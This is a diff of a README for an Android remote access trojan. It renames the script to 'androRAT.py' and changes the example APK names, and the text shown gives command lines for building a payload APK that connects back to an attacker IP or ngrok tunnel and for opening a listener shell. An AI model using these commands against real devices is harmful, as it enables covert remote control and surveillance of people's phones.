@@ -75,7 +75,7 @@ You must run Git bash with administrator privileges.
 
 ```
 Usage:
-  python3 Hacker-Android-RAT.py --build --ngrok [flags]
+  python androRAT.py --build --ngrok [flags]
   Flags:
     -p, --port              Attacker port number (optional by default its set to 8000)
     -o, --output            Name for the apk file (optional by default its set to "karma.apk")
@@ -84,7 +84,7 @@ Usage:
 
 ```
 Usage:
-  python3 Hacker-Android-RAT.py --build [flags]
+  python androRAT.py --build [flags]
   Flags:
     -i, --ip                Attacker IP address (required)
     -p, --port              Attacker port number (required)
@@ -96,7 +96,7 @@ Or you can manually build the apk by importing [Android Code](Android_Code) fold
 ### `shell` mode
 ```
 Usage:
-  python3 Hacker-Android-RAT.py --shell [flags]
+  python3 androRAT.py --shell [flags]
   Flags:
     -i, --ip                Listner IP address
     -p, --port              Listner port number
@@ -133,13 +133,13 @@ In the sh shell there are some sub commands
 ## Examples
 
 * To build the apk using ngrok which will also set the listner:
-```python3 AndroRAT.py --build --ngrok -o evil.apk```
+```python androRAT.py --build --ngrok -o SazaHacks.apk```
 
 * To build the apk using desired ip and port:
-```python3 Hacker-Android-RAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```
+```python androRAT.py --build -i 192.169.x.x -p 8000 -o SazaHacks.apk```
 
 * To get the interpreter:
-```python3 AndroRAT.py --shell -i 0.0.0.0 -p 8000```
+```python androRAT.py --shell -i 0.0.0.0 -p 8000```
 
 ## Interpreter Examples
 * Generating APK
